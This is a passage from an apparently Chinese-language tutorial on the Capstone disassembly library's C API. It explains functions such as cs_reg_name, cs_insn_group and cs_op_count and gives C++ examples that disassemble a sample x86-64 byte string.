%s\n"</span>,</span><br><span class="line">insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str,</span><br><span class="line">insn-&gt;id, cs_insn_name(handle, insn-&gt;id));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印此指令使用的隐式寄存器</span></span><br><span class="line">detail = insn-&gt;detail;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (detail-&gt;regs_read_count &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\tImplicit registers read: "</span>);</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; detail-&gt;regs_read_count; n++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s "</span>, cs_reg_name(handle, detail-&gt;regs_read[n]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印此指令修改的隐式寄存器</span></span><br><span class="line"><span class="keyword">if</span> (detail-&gt;regs_write_count &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\tImplicit registers modified: "</span>);</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; detail-&gt;regs_write_count; n++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s "</span>, cs_reg_name(handle, detail-&gt;regs_write[n]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印此指令所属指令集</span></span><br><span class="line"><span class="keyword">if</span> (detail-&gt;groups_count &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\tThis instruction belongs to groups: "</span>);</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; detail-&gt;groups_count; n++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s "</span>, cs_group_name(handle, detail-&gt;groups[n]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放cs_malloc()分配的内存</span></span><br><span class="line">cs_free(insn, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出<br><img src="https://i.loli.net/2019/07/27/5d3c063cd33b421225.jpg" alt></p><h3 id="cs-reg-name"><a href="#cs-reg-name" class="headerlink" title="cs_reg_name"></a>cs_reg_name</h3><p><code>const char * CAPSTONE_API cs_reg_name(csh handle, unsigned int reg_id);</code></p><p>获取寄存器的名字(string类型)<br>寄存器id可在相关架构的头文件(建立项目时复制到项目文件夹的那些头文件)内找到</p><p>注意： 当处于diet模式时此API不可用，因为引擎不会存储寄存器名</p><p>参数<br>handle: cs_open()返回的句柄<br>reg_id: 寄存器id<br>return: 寄存器的字符名, 如果reg_id不可用返回NULL</p><p>代码实现<br><img src="https://i.loli.net/2019/07/27/5d3c0dcfa15c265034.jpg" alt></p><p>示例(打印RAX)：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle = <span class="number">0</span>;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, cs_reg_name(handle, X86_REG_RAX));</span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出<br><img src="https://i.loli.net/2019/07/27/5d3c100276bac46235.jpg" alt></p><h3 id="cs-insn-name"><a href="#cs-insn-name" class="headerlink" title="cs_insn_name"></a>cs_insn_name</h3><p><code>const char * CAPSTONE_API cs_insn_name(csh handle, unsigned int insn_id);</code></p><p>获取指令的名字(string类型)<br>指令id可在相关架构的头文件(建立项目时复制到项目文件夹的那些头文件)内找到</p><p>注意： 当处于diet模式时此API不可用，因为引擎不会存储寄存器名</p><p>参数<br>handle: cs_open()返回的句柄<br>insn_id: 指令id<br>return: 指令的字符名, 如果insn_id不可用返回NULL</p><p>代码实现<br><img src="https://i.loli.net/2019/07/27/5d3c18c11f4cc51220.jpg" alt></p><p>示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE64 <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00\xe9\xea\xbe\xad\xde\xff\x25\x23\x01\x00\x00\xe8\xdf\xbe\xad\xde\x74\xff"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[] = &#123;</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_64,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE64,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE64) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 64 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">csh handle;</span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line">cs_insn* insn;</span><br><span class="line">cs_detail* detail;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line">cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line">insn = cs_malloc(handle);</span><br><span class="line"></span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x1000</span>;</span><br><span class="line">code = platforms[i].code;</span><br><span class="line">size = platforms[i].size;</span><br><span class="line"><span class="keyword">while</span> (cs_disasm_iter(handle, &amp;code, &amp;size, &amp;address, insn)) &#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s"</span>,</span><br><span class="line">insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"            instruction:  %s"</span>, cs_insn_name(handle, insn-&gt;id));   <span class="comment">//输出该行的操作指令</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">cs_free(insn, <span class="number">1</span>);</span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出<br><img src="https://i.loli.net/2019/07/27/5d3c250a6507076991.jpg" alt></p><h3 id="cs-group-name"><a href="#cs-group-name" class="headerlink" title="cs_group_name"></a>cs_group_name</h3><p><code>const char * CAPSTONE_API cs_group_name(csh handle, unsigned int group_id);</code></p><p>输出指令类型名字<br>指令id可在相关架构的头文件(建立项目时复制到项目文件夹的那些头文件)内找到</p><p>注意： 当处于diet模式时此API不可用，因为引擎不会存储寄存器名</p><p>参数<br>handle: cs_open()返回的句柄<br>insn_id: 指令类型id<br>return: 指令类型的字符名, 如果insn_id不可用返回NULL</p><p>实现代码及示例都与上面类似，略。。</p><h3 id="cs-insn-group"><a href="#cs-insn-group" class="headerlink" title="cs_insn_group"></a>cs_insn_group</h3><p><code>bool CAPSTONE_API cs_insn_group(csh handle, const cs_insn *insn, unsigned int group_id);</code></p><p>检查反汇编后的指令是否属于某个特定指令类型。</p><p>注意：只有当detail选项为ON时这个API可用 (默认OFF).<br>在“diet”模式下，此API没有用，因为引擎不更新insn-&gt;groups数组。</p><p>handle: cs_open()返回的句柄<br>insn: 从cs_disasm()或cs_disasm_iter()接收的反汇编指令结构<br>group_id: 要检查此指令是否属于的指令类型。<br>return: 如果该指令确实属于给定的指令类型，则为true，否则为false。</p><p>代码实现<br><img src="https://i.loli.net/2019/07/27/5d3c28779993339180.png" alt></p><p>示例(判断是否属于跳转指令)：<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE64 <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00\xe9\xea\xbe\xad\xde\xff\x25\x23\x01\x00\x00\xe8\xdf\xbe\xad\xde\x74\xff"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[] = &#123;</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_64,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE64,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE64) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 64 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">csh handle;</span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line">cs_insn* insn;</span><br><span class="line">cs_detail* detail;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line">cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line">insn = cs_malloc(handle);</span><br><span class="line"></span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x1000</span>;</span><br><span class="line">code = platforms[i].code;</span><br><span class="line">size = platforms[i].size;</span><br><span class="line"><span class="keyword">while</span> (cs_disasm_iter(handle, &amp;code, &amp;size, &amp;address, insn)) &#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s          "</span>,</span><br><span class="line">insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"is JUMP:   "</span> &lt;&lt;cs_insn_group(handle, insn, CS_GRP_JUMP) &lt;&lt; <span class="built_in">endl</span>;   <span class="comment">//判断是否为跳转指令</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">cs_free(insn, <span class="number">1</span>);</span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出<br><img src="https://i.loli.net/2019/07/27/5d3c2cad6a6ee36943.jpg" alt></p><h3 id="cs-reg-read"><a href="#cs-reg-read" class="headerlink" title="cs_reg_read"></a>cs_reg_read</h3><p><code>bool CAPSTONE_API cs_reg_read(csh handle, const cs_insn *insn, unsigned int reg_id);</code></p><p>检查反汇编指令是否隐式使用特定寄存器。</p><p>注意:此API仅在启用detail选项时有效(默认为关闭)<br>在“diet”模式下，此API没有用，因为引擎不更新insn-&gt;regs_read数组。</p><p>insn: 从cs_disasm()或cs_disasm_iter()接收的反汇编指令结构<br>reg_id: 标注想要检查的这个指令是否使用了它。<br>return: 如果该指令确实隐式使用了给定寄存器，则为true，否则为false。</p><p>代码实现<br><img src="https://i.loli.net/2019/07/27/5d3c2ec62282774188.jpg" alt></p><p>示例同API cs_disasm_iter</p><h3 id="cs-reg-write"><a href="#cs-reg-write" class="headerlink" title="cs_reg_write"></a>cs_reg_write</h3><p><code>bool CAPSTONE_API cs_reg_write(csh handle, const cs_insn *insn, unsigned int reg_id);</code></p><p>检查反汇编指令是否隐式修改了特定寄存器。</p><p>注意:此API仅在启用detail选项时有效(默认为关闭)<br>在“diet”模式下，此API没有用，因为引擎不更新insn-&gt;regs_read数组。</p><p>insn: 从cs_disasm()或cs_disasm_iter()接收的反汇编指令结构<br>reg_id: 标注想要检查的这个指令是否修改了它。<br>return: 如果该指令确实隐式修改了给定寄存器，则为true，否则为false。</p><p>代码实现<br><img src="https://i.loli.net/2019/07/27/5d3c2f67ee69f50813.jpg" alt></p><p>示例同API cs_disasm_iter</p><h3 id="cs-op-count"><a href="#cs-op-count" class="headerlink" title="cs_op_count"></a>cs_op_count</h3><p><code>int CAPSTONE_API cs_op_count(csh handle, const cs_insn *insn, unsigned int op_type);</code></p><p>计算给定类型的操作数的数量。<br>注意：只有当detail选项为ON时这个API可用 (默认OFF).</p><p>handle: cs_open()返回的句柄<br>insn: 从cs_disasm()或cs_disasm_iter()接收的反汇编指令结构<br>op_type: 要找到的操作数类型。<br>return: 指令insn中给定类型op_type的操作数的数量，返回-1表示查找失败。</p><p>代码实现</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> CAPSTONE_API <span class="title">cs_op_count</span><span class="params">(csh ud, <span class="keyword">const</span> cs_insn *insn, <span class="keyword">unsigned</span> <span class="keyword">int</span> op_type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">handle</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> count = <span class="number">0</span>, i;</span><br><span class="line"><span class="keyword">if</span> (!ud)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">handle = (struct cs_struct *)(<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!handle-&gt;detail) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_DETAIL;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!insn-&gt;id) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_SKIPDATA;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!insn-&gt;detail) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_DETAIL;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle-&gt;errnum = CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (handle-&gt;arch) &#123;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">handle-&gt;errnum = CS_ERR_HANDLE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_ARM:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;arm.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;arm.operands[i].type == (arm_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_ARM64:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;arm64.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;arm64.operands[i].type == (arm64_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_X86:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;x86.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;x86.operands[i].type == (x86_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_MIPS:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;mips.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;mips.operands[i].type == (mips_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_PPC:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;ppc.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;ppc.operands[i].type == (ppc_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_SPARC:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;sparc.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;sparc.operands[i].type == (sparc_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_SYSZ:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;sysz.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;sysz.operands[i].type == (sysz_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_XCORE:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;xcore.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;xcore.operands[i].type == (xcore_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_M68K:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;m68k.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;m68k.operands[i].type == (m68k_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_TMS320C64X:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;tms320c64x.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;tms320c64x.operands[i].type == (tms320c64x_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_M680X:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;m680x.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;m680x.operands[i].type == (m680x_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_EVM:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;evm.op_count; i++)</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;evm.operands[i].type == (evm_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿x86指令操作码类型举例<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> x86_op_type &#123;</span><br><span class="line">X86_OP_INVALID = <span class="number">0</span>, <span class="comment">///&lt; = CS_OP_INVALID (未初始化).</span></span><br><span class="line">X86_OP_REG, <span class="comment">///&lt; = CS_OP_REG (寄存操作码).</span></span><br><span class="line">X86_OP_IMM, <span class="comment">///&lt; = CS_OP_IMM (立即操作码).</span></span><br><span class="line">X86_OP_MEM, <span class="comment">///&lt; = CS_OP_MEM (内存操作码).</span></span><br><span class="line">&#125; x86_op_type;</span><br></pre></td></tr></table></figure></p><p>示例(判断寄存操作码)：<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span 